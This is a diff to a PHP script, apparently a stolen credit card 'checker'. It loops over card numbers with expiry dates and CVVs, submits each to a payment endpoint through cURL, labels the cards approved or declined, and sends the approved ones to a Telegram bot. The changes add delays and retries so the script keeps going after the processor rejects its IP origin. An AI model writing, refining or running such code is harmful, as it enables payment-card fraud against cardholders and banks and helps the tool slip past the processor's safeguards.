@@ -74,9 +74,12 @@ foreach ($cartoes as $card) {
         $success = false;
         $response = '';
         $tempo_resposta = 0;
+        $message = '';
 
         while ($attempt < $max_attempts && !$success) {
             $attempt++;
+            sleep(5); // Espera 5 segundos antes de cada tentativa
+
             // Inicializa cURL
             $ch = curl_init($url);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -108,11 +111,9 @@ foreach ($cartoes as $card) {
             }
 
             // Verifica se a resposta contém o erro de IP inválido
-            if (strpos($resp_text, 'PV with invalid ip origin') !== false && $attempt < $max_attempts) {
-                echo "<span class='badge badge-warning'>Tentativa $attempt/$max_attempts</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-warning'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » <br></b>";
+            if (stripos($message, 'PV with invalid ip origin') !== false && $attempt < $max_attempts) {
                 curl_close($ch); // Fecha a conexão cURL
-                sleep(2); // Espera 2 segundos antes de tentar novamente
-                continue; // Tenta novamente
+                continue; // Tenta novamente após o atraso
             }
 
             $success = true; // Sai do loop se não for o erro de IP ou se for a última tentativa
@@ -132,17 +133,17 @@ foreach ($cartoes as $card) {
                                "⏳ Tempo: ($tempo_resposta SEG)";
             sendTelegramMessage($chatId, $telegramMessage, $botToken);
 
-            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » <br></b>";
+            echo "Aprovada » $cc|$mes|$ano|$cvv » Retorno: $message » Tempo: ($tempo_resposta SEG) »<br>";
         } elseif (strpos($resp_text, 'is3DSecureRequired') !== false) {
-            echo "<span class='badge badge-success'>Aprovada</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-success'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » <br></b>";
+            echo "Aprovada » $cc|$mes|$ano|$cvv » Retorno: $message » Tempo: ($tempo_resposta SEG) »<br>";
         } else {
-            echo "<span class='badge badge-danger'>Reprovada</span> » $cc|$mes|$ano|$cvv » <b> Retorno: <span class='text-danger'>$message</span></b> » <b>Tempo: ($tempo_resposta SEG) » <br></b>";
+            echo "Reprovada » $cc|$mes|$ano|$cvv » Retorno: $message » Tempo: ($tempo_resposta SEG) »<br>";
         }
 
-        sleep(5); // Espera 5 segundos entre as requisições
+        sleep(5); // Espera 5 segundos antes de processar o próximo cartão
 
     } catch (Exception $e) {
-        echo "<span class='badge badge-danger'>Erro</span> » $cc|$mes|$ano|$cvv » <b> Mensagem: <span class='text-danger'>" . $e->getMessage() . "</span></b> » <b>Tempo: ($tempo_resposta SEG) »<br></b>";
+        echo "Erro » $cc|$mes|$ano|$cvv » Mensagem: " . $e->getMessage() . " » Tempo: ($tempo_resposta SEG) »<br>";
     }
 }
 ?>
